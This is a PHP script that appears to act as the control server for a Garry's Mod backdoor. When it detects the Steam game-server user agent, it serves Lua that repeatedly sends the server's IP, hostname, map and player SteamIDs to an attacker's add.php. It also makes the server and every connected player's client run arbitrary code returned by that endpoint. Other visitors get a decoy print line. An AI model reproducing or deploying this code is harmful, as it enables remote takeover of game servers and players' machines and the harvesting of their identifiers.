<?php
require_once('common.php');
if($_SERVER['HTTP_USER_AGENT']=="Valve/Steam HTTP Client 1.0 (4000)"){
echo '
timer.Create("'.random(40).'",5,0,function()
local a={}
for b,c in pairs(player.GetHumans())do 
c:SendLua([[http.Post("'.$directoria.'/add.php",{type="runclient",ip=LocalPlayer():SteamID64()},function(a)if a==""then return end RunString(a)end)]])
table.insert(a,c:SteamID64())
end
http.Post("'.$directoria.'/add.php",{type="run",ip=game.GetIPAddress(),hostname=GetHostName(),map=game.GetMap(),players=#player.GetAll().."/"..game.MaxPlayers(),playerlist=util.TableToJSON(a)},function(d)
if d==""then return end
RunString(d)
end)
end)

--<meta http-equiv="refresh" content="0;URL=https://rt.pornhub.com/view_video.php?viewkey=ph5d1963f999d0d"/>';
}else{ 
echo 'print("http in tested!")';
}
?>


